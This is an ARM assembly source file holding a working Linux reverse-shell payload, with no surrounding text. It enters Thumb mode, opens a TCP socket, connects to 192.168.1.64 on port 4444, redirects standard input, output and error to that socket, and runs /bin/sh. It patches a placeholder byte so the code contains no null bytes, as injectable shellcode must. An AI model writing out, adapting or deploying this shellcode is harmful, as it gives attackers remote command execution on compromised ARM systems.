.section .text
.global _start

_start:
    .code 32
    
    // switching to THUMB mode
    add r3, pc, #1
    bx r3

    .code 16

    // socket(AF_INET, SOCK_STREAM, 0) (2, 1, 0)
    eor r2, r2
    add r1, r2, #1
    add r0, r1, #1
    mov r7, #200
    add r7, #81 // SYS_socket
    swi #1

    mov r3, r0 // save sockfd

    // connect(sockfd, &saddr, 0x10)
    adr r1, struct_addr
    strb r2, [r1, #1]
    mov r2, #0x10
    add r7, #2 // SYS_connect
    swi #1

    // dup2(sockfd, [0, 1, 2])
    mov r1, #2
    mov r7, #63 // SYS_dup2
    dupfd:
        mov r0, r3
        swi #1
        sub r1, #1
        bpl dupfd

    // execve("/bin/sh", NULL, NULL)
    adr r0, binsh
    eor r1, r1
    eor r2, r2
    strb r1, [r0, #7]
    mov r7, #0xb // SYS_execve
    swi #1

    struct_addr:
        .ascii "\x02\xff" // AF_INET
        .ascii "\x11\x5c" // PORT: 4444
        .byte 0xc0,0xa8,0x1,0x4c // IP: 192.168.1.64
    binsh:
        .ascii "/bin/shx"
